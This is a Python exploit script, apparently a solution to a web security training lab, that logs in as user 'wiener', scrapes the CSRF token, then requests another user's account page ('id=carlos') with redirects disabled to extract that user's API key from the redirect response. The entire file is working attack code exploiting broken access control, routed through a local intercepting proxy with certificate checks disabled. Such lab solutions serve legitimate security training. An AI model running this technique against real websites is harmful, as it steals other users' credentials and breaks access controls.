import requests
import urllib3
import re
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def get_csrf_token(s,login_url):
    r=s.get(login_url,verify=False,proxies=proxies)
    soup=BeautifulSoup(r.text,'html.parser')
    csrf=soup.find("input",{'name':'csrf'})['value']
    return csrf



def modify_carlos_endpoint(s,url):
    #first let's login as a wiener
    login_url=url+"/login"
    csrf_token=get_csrf_token(s,login_url)
    data_login={'csrf':csrf_token,'username':'wiener','password':'peter'}
    r=s.post(login_url,data=data_login,verify=False,proxies=proxies)
    res=r.text
    if "Log out" in res:
        print("(+)Successfully loggedin as user wiener")
        
        #now we will change a login method and in there in redirect we will get api for carlos
        modify_url_carlos=url +"/my-account?id=carlos"
        r=s.get(modify_url_carlos,verify=False,proxies=proxies,allow_redirects=False)
        res=r.text
        print("Retrieving the API key of carlos............")
        carlos_api=re.findall("Your API Key is: (.*)\<\/div>",res)
        print(f"The carlos API key is:{carlos_api[0]}")
             
    else:
        print("(-)Failed to login as user wiener")    
        sys.exit(-1)
    
 

def main():
    if len(sys.argv)!=2:
        print("(+)Usage %s <url>" % sys.argv[0])
        print("(+)Example %s www.example.com" % sys.argv[0])
    else:
        s=requests.Session()    
        url=sys.argv[1]
        modify_carlos_endpoint(s,url)



if __name__=="__main__":
    main()